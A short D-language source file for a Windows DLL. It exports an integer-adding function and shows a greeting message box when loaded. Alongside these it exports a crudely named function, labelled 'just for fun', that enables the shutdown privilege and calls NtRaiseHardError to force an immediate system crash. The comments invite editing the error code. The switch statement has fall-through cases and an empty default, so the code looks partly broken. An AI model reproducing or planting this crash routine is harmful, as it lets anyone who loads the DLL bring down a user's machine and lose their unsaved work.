module WindowsApplication1;

import core.sys.windows.windows;
import core.sys.windows.dll;
pragma(lib , "ntdll.lib");
__gshared HINSTANCE g_hInst;
/*
|     Original Author : Arsium
|     Read : https://wiki.dlang.org/Win32_DLLs_in_D  
*/
extern (Windows)
BOOL DllMain(HINSTANCE hInstance, ULONG ulReason, LPVOID pvReserved)
{
    switch (ulReason)
    {
		case DLL_PROCESS_ATTACH:
			//	g_hInst = hInstance;
			MessageBox(NULL, "Hello World!", "Dll says:", MB_OK);
			//	dll_process_attach( hInstance, true );
			//	dll_process_detach( hInstance, true );
			//	break;


		case DLL_PROCESS_DETACH:
			//		dll_process_detach( hInstance, true );
			//	break;

		case DLL_THREAD_ATTACH:
			//dll_thread_attach( true, true );
			//	break;

		case DLL_THREAD_DETACH:
			//	dll_thread_detach( true, true );
			//	//	//	break;

        default:
    }
    return true;
}
extern(C)
{
	export int AddInteger(int a , int b)
	{
		return a + b ;
	}
	export void fuckthem()//just for fun :)
	{
		bool Resp;
		uint RespOnse;
		// 19 for SE_ShutDOWN_PRIVILEGE
		int errorCode  = 0xC0000022; //you can change it
		RtlAdjustPrivilege(19 , true , false , Resp);

		NtRaiseHardError(errorCode , 0,0,0,6 , RespOnse );
		//return 0;
	}

}
extern(Windows) int RtlAdjustPrivilege(int Priv_To_Enable ,bool Enable , bool WasEnable , out bool response );
extern(Windows) int NtRaiseHardError(int ErrorCode , int n , int j , int k ,  int m , out uint response);
